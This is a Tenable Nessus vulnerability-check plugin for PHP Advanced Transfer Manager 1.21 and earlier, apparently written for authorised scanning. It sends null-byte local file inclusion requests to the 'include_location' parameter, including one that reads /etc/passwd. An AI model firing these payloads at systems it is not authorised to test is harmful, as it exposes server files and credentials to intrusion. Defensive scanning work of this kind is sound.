#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(18207);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2005-1604", "CVE-2005-1681");
  script_bugtraq_id(13542, 13691);
  script_osvdb_id(16160, 16692);

  name["english"] = "PHP Advanced Transfer Manager <= 1.21 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote server contains a PHP script that is prone to several flaws,
including arbitrary code execution." );
 script_set_attribute(attribute:"description", value:
"The version of PHP Advanced Transfer Manager installed on the remote
host allows authenticated users to upload arbitrary files and then run
them subject to the privileges of the web server user.  It also allows
unauthenticated users to read arbitrary files on the remote host and
possibly even run arbitrary PHP code, subject to the privileges of the
web server user." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/397677" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/400248" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to PHP Advanced Transfer Manager 1.30 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/05/09");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/05/19");
 script_cvs_date("$Date: 2014/05/21 17:15:44 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:bugada_andrea:php_advanced_transfer_manager");
script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in PHP Advanced Transfer Manager <= 1.21";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2014 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0, php: 1);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpatm", "/phpATM", "/downloads", "/upload", "/files", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Grab index.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  # If it's phpATM.
  if (
    '<a href="http://phpatm.free.fr" target=_blank>' >< res && 
    "Powered by PHP Advanced Transfer Manager v" >< res
  ) {
    # Try to grab a file included in the distribution.
    r = http_send_recv3(method:"GET",
      item:string(
        dir, "/index.php?",
        # nb: try to grab the distribution's Readme.txt.
        "include_location=docs/Readme.txt%00"
      ),
      exit_on_fail: 1,
      port:port
    );
    res = r[2];

    # It's a problem if it looks like the Readme.txt.
    if ("remotely based upon PHP Upload Center" >< res) {
      security_warning(port);
      exit(0);
    }

    if (thorough_tests) {
      # If that failed, try to grab /etc/passwd.
      r = http_send_recv3(method:"GET",
        item:string(
          dir, "/index.php?",
          "include_location=/etc/passwd%00"
        ),
	exit_on_fail: 1,
        port:port
      );
      res = r[2];

      # It's a problem if there's an entry for root.
      if (egrep(string:res, pattern:"root:.+:0:")) {
        security_warning(port);
        exit(0);
      }
    }
  }
}
